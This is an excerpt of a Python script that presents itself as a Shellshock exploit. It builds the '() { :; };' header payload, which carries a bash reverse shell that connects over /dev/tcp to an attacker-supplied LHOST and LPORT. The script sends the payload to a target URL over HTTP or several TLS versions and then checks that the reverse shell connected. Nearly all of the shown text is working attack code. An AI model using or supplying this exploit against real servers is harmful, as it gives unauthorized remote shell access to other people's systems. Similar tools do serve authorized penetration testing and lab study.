...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="Shellshock exploit by b4keSn4ke")
    parser.add_argument(
        "LHOST", help="IP Address on which the reverse shell should connect back to")
    parser.add_argument(
        "LPORT", help="Port on which the reverse shell should connect back to")
    ...
    RHOST = socket.gethostbyname(
        str(args.TARGET_URL).split("/")[2].split(":")[0])
...
def setPayload(args, RHOST):
    ...
    payload = '() { :; }; '
    reverse_shell = '/bin/bash -c /bin/bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(
...
def sendPayload(req, args, protocol, host):
    ...
    if protocol == 'http':
        ...
        for tls_key, tls_value in TLS_VERSIONS.items():
            try:
                print(
                    "[+] Trying to send payload over SSL with {0} ...".format(tls_key))
...
def testRevShell(args, host):
    ...
    try:
        ...
        s.close()
        print("\n[+] Reverse shell from {0} connected to [{1}:{2}].".format(
            host[0], args.LHOST, args.LPORT))
